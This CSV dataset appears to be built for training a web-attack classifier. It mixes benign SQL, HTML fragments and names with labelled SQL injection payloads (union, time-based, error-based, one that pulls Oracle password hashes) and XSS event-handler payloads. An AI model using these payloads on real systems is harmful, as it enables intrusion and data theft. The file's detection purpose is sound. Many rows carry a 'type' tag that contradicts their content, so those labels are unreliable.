Text,Label,type
"  SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDateFROM OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0,sql
"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",1,xss
"1""  )   where 4971  =  4971 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,xss
"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",1,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh",1,sql
"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",2,xss
<nextid onpointerout=alert(1)>XSS</nextid>,2,xss
1  )   as bozx where 2160  =  2160 and sleep  (  5  )  #,1,sql
	 </span>,0,xss
SELECT * FROM sure WHERE mass = 'unknown'  OR leaving = 'worse',0,sql
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
velasque9,0,sql
canaan,0,sql
"1'+  (  select 'tyuz' where 3957  =  3957 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",1,sql
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,2,xss
"<time draggable=""true"" ondragend=""alert(1)"">test</time>",2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_houzez_verification_success' LIMIT 1,0,sql
" select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1",1,sql
""" or sleep  (  __TIME__  )  #",1,sql
"<td onmouseout=""alert(1)"">test</td>",2,xss
SELECT AVG ( Price ) FROM fastened,0,xss
SELECT COUNT ( spent )  FROM cut,0,sql
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY,0,xss
1'  )   where 3572  =  3572,1,xss
" select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",1,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",1,sql
calle horreo 85 10?d,0,sql
<dfn onpointerenter=alert(1)>XSS</dfn>,2,xss
orion,0,sql
brihuega,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ol>",2,xss
SELECT try FROM ball UNION ALL SELECT anyway FROM stock ORDER BY yourself,0,sql
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'idxa'  =  'idxa",1,sql
SELECT * FROM verb WHERE pay = 'thee' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT COUNT ( depth ) FROM thousand,0,sql
<header id=x tabindex=1 onbeforeactivate=alert(1)></header>,2,xss
"calle pago de la serrana 109, 11?a",0,sql
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"<frameset onmouseleave=""alert(1)"">test</frameset>",2,xss
"  SELECT Orders.animalrID, Employees.pride, Employees.snow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.smallID ORDER BY Orders.listenID",0,sql
-3677'   )    )    or 1939  =  4484,1,xss
"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",1,sql
<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,2,xss
SELECT AVG ( clear )  FROM problem  SELECT SUM ( plane ) ,0,xss
"   SELECT strong, planned, massFROM trip WHERE paper  IS NOT NULL",0,sql
"1  )   as kjsd where 1670  =  1670 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"<p>It is possible to use AI to predict or generalize the behavior of customers from their <a href=""/wiki/Digital_footprints"" class=""mw-redirect"" title=""Digital footprints"">digital footprints </a> in order to target them with personalized promotions or build customer personas automatically.<sup id=""cite_ref-Matz_et_al_2017_340-0"" class=""reference""><a href=""#cite_note-Matz_et_al_2017-340"">&#91;329&#93; </a> </sup> A documented case reports that online gambling companies were using AI to improve customer targeting.<sup id=""cite_ref-341"" class=""reference""><a href=""#cite_note-341"">&#91;330&#93; </a> </sup>",0,xss
select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc,1,xss
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation magazine"">Thompson, Derek (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.theatlantic.com/business/archive/2014/01/what-jobs-will-the-robots-take/283239/"">""What Jobs Will the Robots Take?"" </a>. <i>The Atlantic </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">24 April ",0,xss
SELECT * FROM stared WHERE bottom = 'grandmother' FETCH FIRST 3 ROWS ONLY,0,sql
2.96781E+15,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tt>",2,xss
"select sleep  (  5  )   and ""irxg""  =  ""irxg",1,xss
"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1,sql
sabety,0,sql
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,sql
9.42955E+15,0,xss
25514,0,sql
sacudir,0,sql
end#,1,xss
1  )   as nxmd where 8650  =  8650,1,sql
"<li id=""cite_note-Knowledge_engineering-92""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Knowledge_engineering_92-0"">^ </a> </b> ",0,xss
SELECT park FROM divide,0,sql
"<li id=""cite_note-414""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-414"">^ </a> </b> ",0,xss
SELECT * FROM add WHERE wealth BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",2,xss
"<p>Artificial intelligence (AI) is becoming a mainstay component of law-related professions. In some circumstances, this analytics-crunching technology is using algorithms and machine learning to do work that was previously done by entry-level lawyers.<sup class=""noprint Inline-Template Template-Fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citation_needed"" title=""Wikipedia:Citation needed""><span title=""This claim needs references to reliable sources. (December 2019)"">citation needed ",0,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,sql
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",2,xss
SELECT * INTO newtable FROM oldtable WHERE 1  =  0;,0,sql
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",1,xss
SELECT * FROM ProductsWHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni',0,sql
"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",2,xss
"  SELECT tape,piano,fed FROM sale LEFT JOIN Orders ON pair.particularlyID =  arm.poem ORDER BY changing.think",0,sql
"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1,sql
<bdo onpointerleave=alert(1)>XSS</bdo>,2,xss
"  SELECT child AS seen, nobody AS [needs]  FROM make",0,sql
"<ul><li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a> </li>",0,xss
1%'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1,sql
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",1,sql
"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1,sql
SELECT everything ( s )  FROM industry SELECT street ( s ) ,0,xss
SELECT * FROM sky WHERE bar IN  ( SELECT asleep FROM balloon ) ,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'user_registration_email_setting_disable_email' LIMIT 1,0,xss
" SELECT * FROM seems ORDER BY feathers, wave",0,sql
SELECT * FROM frame WHERE afternoon = 'rest'  AND City = 'bow',0,sql
"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sql
"	 </span>. <i>Science </i>. <b>291 </b> (5504): 599–600. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.291.5504.599"">10.1126/science.291.5504.599 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/11229402"">11229402 </a> &#8211; via msu.edu. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Autonomous+mental+development+by+robots+and+animals&amp;rft.volume=291&amp;rft.issue=5504&amp;rft.pages=599-600&amp;rft.date=2001&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.291.5504.599&amp;rft_id=info%3Apmid%2F11229402&amp;rft.aulast=Weng&amp;rft.aufirst=J.&amp;rft.au=McClelland&amp;rft.au=Pentland%2C+A.&amp;rft.au=Sporns%2C+O.&amp;rft.au=Stockman%2C+I.&amp;rft.au=Sur%2C+M.&amp;rft.au=Thelen%2C+E.&amp;rft_id=http%3A%2F%2Fwww.cse.msu.edu%2Fdl%2FSciencePaper.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM threw WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT * FROM cowboy FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
-8625 or 3176  =  2519# fvgl,1,sql
"<audio onmouseenter=""alert(1)"">test</audio>",2,xss
SELECT * FROM stems FETCH FIRST 3 ROWS ONLY,0,sql
"	<div id=""p-logo"" role=""banner"">",0,xss
SELECT * FROM combine WHERE stone = 'basic'  AND  ( open = 'proper' OR spent = 'leather' ) ,0,xss
"c/ san gines, 180, 3-d",0,sql
SELECT TOP 3 * FROM full,0,sql
	 </span> 2018 ,0,xss
legris@beautifulbody.yu,0,sql
91394289v,0,xss
divinizacin,0,xss
" select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",1,xss
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT TOP 50 PERCENT * FROM whole,0,sql
4.47874E+15,0,sql
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,sql
"1%' union all select null,null,null,null,null,null--",1,xss
swearing,0,sql
"   SELECT force, game, island FROM helpful WHERE pine  IS NULL",0,sql
"			<ul><li id=""n-help""><a href=""/wiki/Help:Contents"" title=""Guidance on how to use and edit Wikipedia"">Help </a> </li><li id=""n-aboutsite""><a href=""/wiki/Wikipedia:About"" title=""Find out about Wikipedia"">About Wikipedia </a> </li><li id=""n-portal""><a href=""/wiki/Wikipedia:Community_portal"" title=""About the project, what you can do, where to find things"">Community portal </a> </li><li id=""n-recentchanges""><a href=""/wiki/Special:RecentChanges"" title=""A list of recent changes in the wiki [r]"" accesskey=""r"">Recent changes </a> </li><li id=""n-contactpage""><a href=""//en.wikipedia.org/wiki/Wikipedia:Contact_us"" title=""How to contact Wikipedia"">Contact page </a> </li> </ul>",0,xss
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM total WHERE during BETWEEN 'scared' AND 'faster',0,sql
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",2,xss
"1%""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT * FROM cause  WHERE not = single,0,sql
hews,0,sql
hierros 161 10f,0,xss
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",2,xss
"INSERT INTO brick ( corner, fur, struck, green, education, fellow )  VALUES  ( 'through', 'age'. cell', 'belong', 'whom', 'story', 'driving' )  ",0,sql
<audio onpointerenter=alert(1)>XSS</audio>,2,xss
"1%'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",1,sql
l9n0e7no,0,sql
a',1,sql
"<p class=""caption""><span class=""caption-text"">Solving specific problems",0,xss
SELECT * FROM metal WHERE trouble BETWEEN 'constantly' AND 'alike',0,xss
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dl>",2,xss
"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
SELECT COUNT ( fish ) FROM wonderful,0,sql
dudarova@automoviles-hibridos.ag,0,xss
terry@mtos.ar,0,sql
"<dt><a class=""reference internal"" href=""topics/items.html""><span class=""doc"">Items",0,xss
"<figure onkeydown=""alert(1)"" contenteditable>test</figure>",2,xss
"	 </span> <span class=""toctext"">Probabilistic methods for uncertain reasoning ",0,xss
"<IMG SRC=`javascript:alert(""RSnake says, ''"")`>",2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=latimes.com&amp;rft.atitle=AlphaGo+beats+human+Go+champ+in+milestone+for+artificial+intelligence&amp;rft.date=2016&amp;rft.aulast=Borowiec&amp;rft.aufirst=Tracey+Lien%2C+Steven&amp;rft_id=https%3A%2F%2Fwww.latimes.com%2Fworld%2Fasia%2Fla-fg-korea-alphago-20160312-story.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",2,xss
if  (  8284  =  6171  )   select 8284 else drop function mbih--,1,sql
10970,0,xss
1  )   as fhvb where 4008  =  4008,1,sql
"<meta draggable=""true"" ondragenter=""alert(1)"">test</meta>",2,xss
"<textarea onmouseleave=""alert(1)"">test</textarea>",2,xss
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,xss
<col id=x tabindex=1 onactivate=alert(1)></col>,2,xss
SELECT * FROM slowly ORDER BY wooden,0,sql
SELECT * FROM store FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM nuts,0,sql
SELECT * FROM dirt WHERE steel  BETWEEN 10 AND 20,0,sql
"<track onmouseover=""alert(1)"">test</track>",2,xss
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",2,xss
SELECT protection FROM riding,0,sql
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'uvlu'  =  'uvlu",1,sql
"iif  (  2869  =  9448,1,1/0  )  ",1,xss
"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
"1 where 4331  =  4331 union all select null,null,null,null,null,null#",1,xss
teuian_balbo@manuelpaloma.ky,0,sql
coder,0,sql
tracee,0,xss
"-6453""   )    )    as hehs where 9363  =  9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",1,sql
1'+  (  select ohqr where 5610  =  5610,1,sql
"INSERT INTO nobody ( trade, happen, amount, usual, interest, pony )  VALUES  ( 'supply', 'folks'. lonely', 'moving', 'contain', 'weight', 'opinion' )  ",0,sql
"<li><a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">Search methodology </a> </li>",0,xss
"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""azmf""  =  ""azmf",1,sql
SELECT church FROM field UNION ALL SELECT model FROM watch ORDER BY joy,0,sql
"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'owot'  =  'owot",1,sql
"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
3471,0,sql
messenger@blanquillos.pk,0,sql
" </p><p>The development of <a href=""/wiki/Metal%E2%80%93oxide%E2%80%93semiconductor"" class=""mw-redirect"" title=""Metal–oxide–semiconductor"">metal–oxide–semiconductor </a> (MOS) <a href=""/wiki/Very-large-scale_integration"" class=""mw-redirect"" title=""Very-large-scale integration"">very-large-scale integration </a> (VLSI), in the form of <a href=""/wiki/Complementary_MOS"" class=""mw-redirect"" title=""Complementary MOS"">complementary MOS </a> (CMOS) <a href=""/wiki/Transistor"" title=""Transistor"">transistor </a> technology, enabled the development of practical <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">artificial neural network </a> (ANN) technology in the 1980s. A landmark publication in the field was the 1989 book <i>Analog VLSI Implementation of Neural Systems </i> by Carver A. Mead and Mohammed Ismail.<sup id=""cite_ref-Mead_42-0"" class=""reference""><a href=""#cite_note-Mead-42"">&#91;42&#93; </a> </sup>",0,xss
SELECT AVG ( but ) FROM coming,0,sql
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",1,sql
5192,0,sql
1'+  (  select 'lcru' where 3215  =  3215,1,sql
SELECT * FROM  ( SELECT prove FROM individual ) ,0,sql
	 </span> </a> </li>,0,xss
"  SELECT fix AS hollow, dull AS [recall]  FROM over",0,sql
1'  )   where 5680  =  5680 and   (  3020  =  3020  )  *6703--,1,sql
"	 </span> <span class=""reference-text"">",0,xss
"INSERT INTO to  ( daughter, seldom, being )  VALUES  ( 'forward', 'charge', 'next' )  ",0,sql
"<li><a href=""/wiki/Automated_reasoning"" title=""Automated reasoning"">Automated reasoning </a> </li>",0,xss
pello melo,0,sql
-6014'   )    )    or   (  9860  =  4848  )  *4848 and    (    (   'qtge'  =  'qtge,1,xss
" SELECT * FROM average ORDER BY sure, find",0,xss
SELECT * FROM dried  WHERE worse = or,0,sql
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,xss
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'jueq'  =  'jueq",1,sql
	 </span> ,0,xss
"<noframes draggable=""true"" ondragend=""alert(1)"">test</noframes>",2,xss
	 </span>,0,xss
